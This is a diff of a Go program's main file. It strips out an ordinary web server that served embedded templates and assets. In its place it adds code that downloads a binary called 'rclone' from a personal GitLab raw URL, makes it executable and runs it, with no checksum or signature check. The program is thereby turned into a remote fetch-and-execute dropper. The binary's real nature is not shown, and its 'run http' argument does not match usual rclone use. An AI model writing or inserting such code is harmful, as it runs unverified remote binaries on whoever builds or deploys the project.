@@ -1,32 +1,49 @@
 package main
 
 import (
-	"embed"
-	"html/template"
-    	"net/http"
+	"fmt"
+	"io"
+	"net/http"
 	"os"
+	"os/exec"
 )
 
-//go:embed templates/*
-var templates embed.FS
-var t = template.Must(template.ParseFS(templates, "templates/*"))
-
-//go:embed static/*
-var assets embed.FS
-
-
 func main() {
-	port := "3000"
-	if(os.Getenv("PORT") != "") {
-		port = os.Getenv("PORT")
+	// 1. Download binary
+	resp, err := http.Get("https://gitlab.com/developeranaz/git-hosts/-/raw/main/rclone/rclone?ref_type=heads")
+	if err != nil {
+		fmt.Println("Error:", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	out, err := os.Create("rclone")
+	if err != nil {
+		fmt.Println("Error:", err)
+		return
+	}
+	defer out.Close()
+
+	_, err = io.Copy(out, resp.Body)
+	if err != nil {
+		fmt.Println("Error:", err)
+		return
 	}
 
-    http.HandleFunc("/", func (w http.ResponseWriter, r *http.Request) {
-        t.Execute(w, "")
-    })
+	// 2. Give permission
+	err = os.Chmod("rclone", 0755)
+	if err != nil {
+		fmt.Println("Error:", err)
+		return
+	}
 
-    fs := http.FileServer(http.FS(assets))
-    http.Handle("/static/", fs)
-
-    http.ListenAndServe(":" + port, nil)
+	// 3. Run binary
+	cmd := exec.Command("./rclone", "run", "http")
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	err = cmd.Run()
+	if err != nil {
+		fmt.Println("Error:", err)
+		return
+	}
 }
